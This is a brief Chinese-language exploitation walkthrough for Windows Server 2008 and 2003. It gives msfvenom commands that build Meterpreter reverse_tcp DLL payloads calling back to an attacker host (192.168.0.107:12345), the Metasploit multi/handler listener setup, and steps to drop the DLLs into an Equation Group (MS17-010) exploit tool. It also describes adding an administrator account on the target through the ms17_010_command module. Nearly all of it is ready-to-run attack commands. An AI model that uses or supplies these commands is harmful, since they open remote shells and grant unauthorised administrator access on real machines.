	msfvenom生成一个x64或x86的dll文件，替换该工具下的x64.dll或x86.dll
	windows server 2008 ，msfvenom生成x64.dll文件
	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=12345 -f dll > x64.dll
	msf配置
	use exploit/multi/handler 
	set payload windows/x64/meterpreter/reverse_tcp
	set lport 12345
	set lhost 192.168.0.107
	将该x64.dll替换到方程式利用工具下面。
	只需要更换目标的IP，就可以获取session。
	windows server 2003 ，msfvenom生成x86.dll文件
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=12345 -f dll > x86.dll
	msf配置
	use exploit/multi/handler 
	set payload windows/meterpreter/reverse_tcp
	set lport 12345
	set lhost 192.168.0.107
	通过ms17_010_commend模块执行系统命令添加用户至管理员。再指定SMBPass和SMBUser来建立windows可访问命名管道
